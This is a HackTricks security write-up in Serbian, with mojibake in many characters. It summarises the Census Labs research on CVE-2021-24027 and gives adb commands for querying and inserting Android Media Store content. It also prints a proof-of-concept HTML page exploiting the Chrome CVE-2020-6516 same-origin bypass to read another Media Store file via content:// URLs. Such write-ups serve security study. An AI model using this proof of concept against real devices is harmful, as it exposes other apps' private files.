{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Ovo je saÅ¾etak posta [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Listing Files in Media Store
Da biste naveli datoteke kojima upravlja Media Store, moÅ¾e se koristiti sledeÄ‡a komanda:
```bash
$ content query --uri content://media/external/file
```
Za ljudima prijatniji izlaz, prikazujuÄ‡i samo identifikator i putanju svake indeksirane datoteke:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
SadrÅ¾ajni provajderi su izolovani u svom privatnom imenskom prostoru. Pristup provajderu zahteva specifiÄan `content://` URI. Informacije o putanjama za pristup provajderu mogu se dobiti iz manifestacija aplikacija ili iz izvornog koda Android okvira.

### Chromeov pristup sadrÅ¾ajnim provajderima
Chrome na Androidu moÅ¾e pristupiti sadrÅ¾ajnim provajderima putem `content://` sheme, Å¡to mu omoguÄ‡ava pristup resursima kao Å¡to su fotografije ili dokumenti koje su izvezle aplikacije treÄ‡ih strana. Da ilustrujemo ovo, datoteka se moÅ¾e umetnuti u Media Store i zatim pristupiti putem Chrome-a:

Umetnite prilagoÄ‘eni unos u Media Store:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Otkrijte identifikator novoinsertovanog fajla:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Datoteku zatim moÅ¾ete pregledati u Chrome-u koristeÄ‡i URL konstruisan sa identifikatorom datoteke.

Na primer, da biste naveli datoteke povezane sa odreÄ‘enom aplikacijom:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Bypass politike iste domene

_Politika iste domene_ (SOP) je bezbednosni protokol u pregledaÄima koji ograniÄava web stranice da komuniciraju sa resursima iz razliÄitih domena osim ako to nije izriÄito dozvoljeno politikom deljenja resursa izmeÄ‘u domena (CORS). Ova politika ima za cilj da spreÄi curenje informacija i laÅ¾ne zahteve izmeÄ‘u sajtova. Chrome smatra `content://` kao lokalnu shemu, Å¡to podrazumeva stroÅ¾e SOP pravila, gde se svaka lokalna shema URL tretira kao posebna domena.

MeÄ‘utim, CVE-2020-6516 je bila ranjivost u Chrome-u koja je omoguÄ‡ila zaobilaÅ¾enje SOP pravila za resurse uÄitane putem `content://` URL-a. U suÅ¡tini, JavaScript kod sa `content://` URL-a mogao je da pristupi drugim resursima uÄitanim putem `content://` URL-a, Å¡to je predstavljalo znaÄajnu bezbednosnu zabrinutost, posebno na Android ureÄ‘ajima koji koriste verzije starije od Android 10, gde nije implementirano ograniÄeno skladiÅ¡tenje.

Dokaz koncepta u nastavku prikazuje ovu ranjivost, gde HTML dokument, nakon Å¡to je otpremljen pod **/sdcard** i dodat u Media Store, koristi `XMLHttpRequest` u svom JavaScript-u da pristupi i prikaÅ¾e sadrÅ¾aj druge datoteke u Media Store-u, zaobilazeÄ‡i SOP pravila.

Dokaz koncepta HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
